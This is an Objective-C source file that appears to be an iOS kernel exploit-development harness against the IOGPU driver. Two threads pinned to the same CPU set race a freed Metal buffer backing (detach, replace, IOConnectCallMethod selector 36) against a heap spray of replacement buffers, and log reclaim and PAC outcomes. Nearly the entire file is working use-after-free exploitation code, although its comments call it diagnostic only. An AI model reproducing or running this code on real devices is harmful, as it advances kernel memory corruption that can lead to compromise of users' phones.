//
//  P022Cpu0DrainDelay.m
//  P007OpenOnly
//
//  p022: p020v2 + all threads affinity_tag 1 (CPU-0 set), drain 512,
//  lockstep: B free → 100us → A sel36 → B spray. Log sout vs calib.
//  Not KRW. Diagnostic only.
//

#import "P022Cpu0DrainDelay.h"

#import <Metal/Metal.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/thread_act.h>
#import <mach/thread_policy.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdatomic.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P022_DRAIN_COUNT   512
#define P022_RACE_SECONDS  60
#define P022_SPRAY_RING    256
#define P022_SPRAY_LEN     0x400
#define P022_PAGE          0x4000
#define P022_HIST          8
#define P022_DELAY_US      100
#define P022_AFFINITY      1
#define P022_LOG_DIFFS     16

#define P022_WAIT_FREE   0
#define P022_AFTER_FREE  1
#define P022_AFTER_SEL   2

typedef int (*P022Detach_t)(void *);
typedef int (*P022Replace_t)(void *, void *, uint64_t);
typedef uint32_t (*P022GetType_t)(void *);
typedef uint32_t (*P022GetConn_t)(void *);
typedef kern_return_t (*P022Iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

typedef struct {
    unsigned kr;
    unsigned long long n;
} p022_kh;

typedef struct {
    uint64_t v;
    unsigned long long n;
} p022_oh;

static NSMutableString *p022_buf;
static int p022_fd = -1;

static void p022_log(const char *fmt, ...)
{
    char lb[800];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n < 0)
        return;
    if (n > (int)sizeof(lb) - 2)
        n = (int)sizeof(lb) - 2;
    lb[n++] = '\n';
    lb[n] = 0;
    @synchronized ([NSString class]) {
        if (p022_buf)
            [p022_buf appendFormat:@"%.*s", n, lb];
        if (p022_fd >= 0) {
            write(p022_fd, lb, (size_t)n);
            fcntl(p022_fd, F_FULLFSYNC);
        }
    }
}

static NSString *p022_finish(void)
{
    if (p022_fd >= 0) {
        fcntl(p022_fd, F_FULLFSYNC);
        close(p022_fd);
        p022_fd = -1;
    }
    return p022_buf ?: @"STOP: no log";
}

static const char *p022_kr(kern_return_t r)
{
    unsigned u = (unsigned)r;
    if (r == 0)
        return "SUCCESS";
    if (u == 0xe00002c2)
        return "BadArgument";
    if (u == 0xe00002bc)
        return "Error";
    return "?";
}

static id p022_unwrap(id buf)
{
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"])
            break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s])
            break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf)
            break;
        buf = b;
    }
    return buf;
}

static void *p022_ref(id buf)
{
    buf = p022_unwrap(buf);
    SEL s = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:s])
        return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, s);
}

static void *p022_ivar(id obj, const char *name)
{
    if (!obj || !name)
        return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val)
            return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p022_strip(void *p)
{
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p022_is_heap(void *p)
{
    uintptr_t x = (uintptr_t)p022_strip(p);
    if (x < 0x100000000ULL)
        return 0;
    if ((x & 7) != 0)
        return 0;
    if ((x >> 28) == 0x16)
        return 0;
    return 1;
}

static uint32_t p022_res_id(void *res)
{
    if (!res)
        return 0;
    return *(uint32_t *)((uint8_t *)res + 0x30);
}

static uint32_t p022_res_conn(void *res)
{
    if (!res)
        return 0;
    void *devw = p022_strip(*(void **)((uint8_t *)res + 0x10));
    if (!p022_is_heap(devw))
        return 0;
    return *(uint32_t *)((uint8_t *)devw + 0x14);
}

static void p022_hist_kr(p022_kh *h, unsigned kr)
{
    @synchronized ([NSString class]) {
        for (int i = 0; i < P022_HIST; i++) {
            if (h[i].n && h[i].kr == kr) {
                h[i].n++;
                return;
            }
            if (h[i].n == 0) {
                h[i].kr = kr;
                h[i].n = 1;
                return;
            }
        }
        h[P022_HIST - 1].n++;
    }
}

static void p022_hist_out(p022_oh *h, uint64_t v)
{
    @synchronized ([NSString class]) {
        for (int i = 0; i < P022_HIST; i++) {
            if (h[i].n && h[i].v == v) {
                h[i].n++;
                return;
            }
            if (h[i].n == 0) {
                h[i].v = v;
                h[i].n = 1;
                return;
            }
        }
        h[P022_HIST - 1].n++;
    }
}

static int p022_nsout(p022_oh *h)
{
    int n = 0;
    for (int i = 0; i < P022_HIST && h[i].n; i++)
        n++;
    return n;
}

static void p022_pin_cpu0(void)
{
    thread_affinity_policy_data_t pol;
    pol.affinity_tag = P022_AFFINITY;
    (void)thread_policy_set(pthread_mach_thread_np(pthread_self()),
                            THREAD_AFFINITY_POLICY,
                            (thread_policy_t)&pol,
                            THREAD_AFFINITY_POLICY_COUNT);
}

static id p022_create80(id dev, P022GetType_t getType, vm_size_t vmsz, NSUInteger len,
                        vm_address_t *out_pg, void **out_ref)
{
    *out_pg = 0;
    *out_ref = NULL;
    vm_address_t pg = 0;
    if (vm_allocate(mach_task_self(), &pg, vmsz, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg)
        return nil;
    size_t fill = (size_t)len;
    if (fill > (size_t)vmsz)
        fill = (size_t)vmsz;
    memset((void *)(uintptr_t)pg, 0xEE, fill);
    id buf = [dev newBufferWithBytesNoCopy:(void *)(uintptr_t)pg
                                    length:len
                                   options:MTLResourceStorageModeShared
                               deallocator:^(void *p, NSUInteger n) {
                                   (void)p;
                                   (void)n;
                               }];
    void *r = buf ? p022_ref(buf) : NULL;
    uint32_t t = (r && getType) ? getType(r) : 0;
    if (!buf || !r || t != 0x80) {
        buf = nil;
        vm_deallocate(mach_task_self(), pg, vmsz);
        return nil;
    }
    *out_pg = pg;
    *out_ref = r;
    return buf;
}

typedef struct {
    void *ref;
    P022Detach_t detach;
    P022Replace_t repl;
    P022Iocall_t iocall;
    mach_port_t conn;
    uint32_t id;
    uint64_t calib_sout;
    void *repl_page;
    size_t repl_len;
    __unsafe_unretained id spray_dev;
    P022GetType_t getType;
    atomic_int *stop;
    atomic_int *phase;
    atomic_ullong *itersA;
    atomic_ullong *itersB;
    atomic_ullong *krSuccess;
    atomic_ullong *krBadArg;
    atomic_ullong *krOther;
    atomic_ullong *sout_eq;
    atomic_ullong *sout_ne;
    p022_kh *kh;
    p022_oh *oh;
} p022_arg;

static void *p022_threadA(void *u)
{
    p022_arg *st = (p022_arg *)u;
    p022_pin_cpu0();
    uint64_t in[3] = { st->id, 0, 0x1000 };
    while (!atomic_load(st->stop)) {
        while (atomic_load(st->phase) != P022_AFTER_FREE && !atomic_load(st->stop))
            ;
        if (atomic_load(st->stop))
            break;
        uint64_t out = 0;
        uint32_t nout = 1;
        kern_return_t kr = st->iocall(st->conn, 36, in, 3, NULL, 0, &out, &nout, NULL, NULL);
        p022_hist_kr(st->kh, (unsigned)kr);
        if (kr == 0) {
            p022_hist_out(st->oh, out);
            atomic_fetch_add(st->krSuccess, 1);
            if (out == st->calib_sout) {
                atomic_fetch_add(st->sout_eq, 1);
            } else {
                unsigned long long n = atomic_fetch_add(st->sout_ne, 1);
                if (n < P022_LOG_DIFFS) {
                    p022_log("p022 [sout] DIFF calib=0x%llx now=0x%llx (fn4 always new IOSurface; "
                             "reclaim evidence is 0x9857cd8 / no-panic after free)",
                             (unsigned long long)st->calib_sout, (unsigned long long)out);
                }
            }
        } else if ((unsigned)kr == 0xe00002c2) {
            atomic_fetch_add(st->krBadArg, 1);
        } else {
            atomic_fetch_add(st->krOther, 1);
        }
        atomic_fetch_add(st->itersA, 1);
        atomic_store(st->phase, P022_AFTER_SEL);
    }
    return NULL;
}

static void *p022_threadB(void *u)
{
    p022_arg *st = (p022_arg *)u;
    p022_pin_cpu0();
    NSMutableArray *ring = [NSMutableArray arrayWithCapacity:P022_SPRAY_RING];
    vm_address_t pgs[P022_SPRAY_RING];
    memset(pgs, 0, sizeof(pgs));
    int slot = 0;
    while (!atomic_load(st->stop)) {
        @autoreleasepool {
            while (atomic_load(st->phase) != P022_WAIT_FREE && !atomic_load(st->stop))
                ;
            if (atomic_load(st->stop))
                break;
            if (st->detach(st->ref) != 0)
                continue;
            if (st->repl(st->ref, st->repl_page, st->repl_len) != 0)
                continue;
            usleep(P022_DELAY_US);
            atomic_store(st->phase, P022_AFTER_FREE);
            while (atomic_load(st->phase) != P022_AFTER_SEL && !atomic_load(st->stop))
                ;
            if (atomic_load(st->stop))
                break;
            for (int c = 0; c < 4; c++) {
                vm_address_t pg = 0;
                void *r = NULL;
                id b = p022_create80(st->spray_dev, st->getType, P022_PAGE, P022_SPRAY_LEN,
                                     &pg, &r);
                if (!b)
                    continue;
                if ((int)ring.count == P022_SPRAY_RING) {
                    [ring replaceObjectAtIndex:(NSUInteger)slot withObject:b];
                    if (pgs[slot])
                        vm_deallocate(mach_task_self(), pgs[slot], P022_PAGE);
                } else {
                    [ring addObject:b];
                }
                pgs[slot] = pg;
                slot = (slot + 1) % P022_SPRAY_RING;
            }
            atomic_fetch_add(st->itersB, 1);
            atomic_store(st->phase, P022_WAIT_FREE);
        }
    }
    (void)ring;
    return NULL;
}

@implementation P022Cpu0DrainDelay

+ (NSString *)runP022Cpu0DrainDelay
{
    p022_pin_cpu0();

    p022_buf = [NSMutableString string];
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p022_cpu0_drain_delay_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p022_fd = open(path.fileSystemRepresentation, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    p022_log("=== p022 session: CPU-0 drain-delay reclaim ===");
    p022_log("[*] All threads THREAD_AFFINITY_POLICY tag=%d (same-core set; iOS has no bind-to-cpu0)",
             P022_AFFINITY);
    p022_log("[*] Drain %d, then lockstep B-free → %dus → A-sel36 → B-spray",
             P022_DRAIN_COUNT, P022_DELAY_US);
    p022_log("[*] 0x9857cc8 = missed reclaim; 0x9857cd8 = PAC passed (reclaim)");
    p022_log("[*] sout vs calib logged (first %d diffs). NOT KRW.", P022_LOG_DIFFS);
    fcntl(p022_fd, F_FULLFSYNC);

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu)
        iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu) {
        p022_log("p022 STOP dlopen IOGPU");
        return p022_finish();
    }

    P022Detach_t detach = (P022Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    P022Replace_t repl = (P022Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P022GetType_t getType = (P022GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P022GetConn_t devConn = (P022GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    P022Iocall_t iocall = iokit ? (P022Iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!detach || !repl || !iocall || !getType) {
        p022_log("p022 STOP syms");
        return p022_finish();
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) {
        p022_log("p022 STOP no device");
        return p022_finish();
    }
    id mtlDev = p022_unwrap(dev);
    void *devRef = p022_strip(p022_ivar(mtlDev, "_deviceRef"));
    uint32_t dconn = (devConn && p022_is_heap(devRef)) ? devConn(devRef) : 0;

    vm_address_t pg = 0, pr = 0;
    void *ref = NULL;
    id buf = p022_create80(dev, getType, P022_PAGE, P022_PAGE, &pg, &ref);
    if (!buf || !ref) {
        p022_log("p022 [0] STOP no type 0x80");
        return p022_finish();
    }
    if (vm_allocate(mach_task_self(), &pr, P022_PAGE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pr) {
        p022_log("p022 [0] STOP replace page");
        return p022_finish();
    }
    memset((void *)(uintptr_t)pr, 0x43, P022_PAGE);

    uint32_t rid = p022_res_id(ref);
    uint32_t rconn = p022_res_conn(ref);
    uint32_t conn = dconn ? dconn : rconn;
    p022_log("p022 [0] dconn=0x%x id=%u", conn, rid);
    if (!conn || !rid) {
        p022_log("p022 STOP conn/id");
        return p022_finish();
    }
    fcntl(p022_fd, F_FULLFSYNC);

    uint64_t cin[3] = { rid, 0, 0x1000 };
    uint64_t cout = 0;
    uint32_t nout = 1;
    kern_return_t ckr = iocall(conn, 36, cin, 3, NULL, 0, &cout, &nout, NULL, NULL);
    p022_log("p022 [calib] sel36 kr=0x%x (%s) sout=0x%llx",
             (unsigned)ckr, p022_kr(ckr), (unsigned long long)cout);
    fcntl(p022_fd, F_FULLFSYNC);
    if (ckr != 0) {
        p022_log("p022 STOP calib failed");
        return p022_finish();
    }
    uint64_t calib = cout;

    NSMutableArray *drain = [NSMutableArray array];
    vm_address_t drain_pg[P022_DRAIN_COUNT];
    memset(drain_pg, 0, sizeof(drain_pg));
    int nd = 0;
    for (int i = 0; i < P022_DRAIN_COUNT; i++) {
        vm_address_t wpg = 0;
        void *wr = NULL;
        id wb = p022_create80(dev, getType, P022_PAGE, P022_PAGE, &wpg, &wr);
        if (!wb)
            continue;
        [drain addObject:wb];
        drain_pg[nd++] = wpg;
    }
    [drain removeAllObjects];
    for (int i = 0; i < nd; i++) {
        if (drain_pg[i])
            vm_deallocate(mach_task_self(), drain_pg[i], P022_PAGE);
    }
    p022_log("p022 [drain] created+destroyed %d (want %d) on affinity_tag %d",
             nd, P022_DRAIN_COUNT, P022_AFFINITY);
    fcntl(p022_fd, F_FULLFSYNC);

    p022_kh kh[P022_HIST];
    p022_oh oh[P022_HIST];
    memset(kh, 0, sizeof(kh));
    memset(oh, 0, sizeof(oh));
    atomic_int stop = 0;
    atomic_int phase = P022_WAIT_FREE;
    atomic_ullong ia = 0, ib = 0, k0 = 0, k2c2 = 0, koth = 0;
    atomic_ullong seq = 0, sne = 0;

    p022_arg a;
    memset(&a, 0, sizeof(a));
    a.ref = ref;
    a.detach = detach;
    a.repl = repl;
    a.iocall = iocall;
    a.conn = conn;
    a.id = rid;
    a.calib_sout = calib;
    a.repl_page = (void *)(uintptr_t)pr;
    a.repl_len = P022_PAGE;
    a.spray_dev = dev;
    a.getType = getType;
    a.stop = &stop;
    a.phase = &phase;
    a.itersA = &ia;
    a.itersB = &ib;
    a.krSuccess = &k0;
    a.krBadArg = &k2c2;
    a.krOther = &koth;
    a.sout_eq = &seq;
    a.sout_ne = &sne;
    a.kh = kh;
    a.oh = oh;
    p022_arg b = a;

    pthread_t tA, tB;
    if (pthread_create(&tA, NULL, p022_threadA, &a) != 0 ||
        pthread_create(&tB, NULL, p022_threadB, &b) != 0) {
        atomic_store(&stop, 1);
        p022_log("p022 STOP pthread");
        return p022_finish();
    }

    for (int t = 0; t < P022_RACE_SECONDS; t += 5) {
        sleep(5);
        p022_log("p022 [race] t=%ds A=%llu B=%llu kr={0x0:%llu 2c2:%llu other:%llu} "
                 "souts=%d sout_eq=%llu sout_ne=%llu",
                 t + 5,
                 (unsigned long long)atomic_load(&ia),
                 (unsigned long long)atomic_load(&ib),
                 (unsigned long long)atomic_load(&k0),
                 (unsigned long long)atomic_load(&k2c2),
                 (unsigned long long)atomic_load(&koth),
                 p022_nsout(oh),
                 (unsigned long long)atomic_load(&seq),
                 (unsigned long long)atomic_load(&sne));
        fcntl(p022_fd, F_FULLFSYNC);
    }

    atomic_store(&stop, 1);
    pthread_join(tA, NULL);
    pthread_join(tB, NULL);

    p022_log("p022 [calib] sout=0x%llx", (unsigned long long)calib);
    p022_log("p022 verdict: SURVIVED %ds A=%llu B=%llu souts=%d eq=%llu ne=%llu",
             P022_RACE_SECONDS,
             (unsigned long long)atomic_load(&ia),
             (unsigned long long)atomic_load(&ib),
             p022_nsout(oh),
             (unsigned long long)atomic_load(&seq),
             (unsigned long long)atomic_load(&sne));
    p022_log("p022 note: fn4 mints a fresh IOSurface every SUCCESS so sout_ne is expected; "
             "reclaim = panic 0x9857cd8 or silent continue after free. NOT KRW.");
    fcntl(p022_fd, F_FULLFSYNC);

    buf = nil;
    if (pg)
        vm_deallocate(mach_task_self(), pg, P022_PAGE);
    if (pr)
        vm_deallocate(mach_task_self(), pr, P022_PAGE);
    return p022_finish();
}

@end
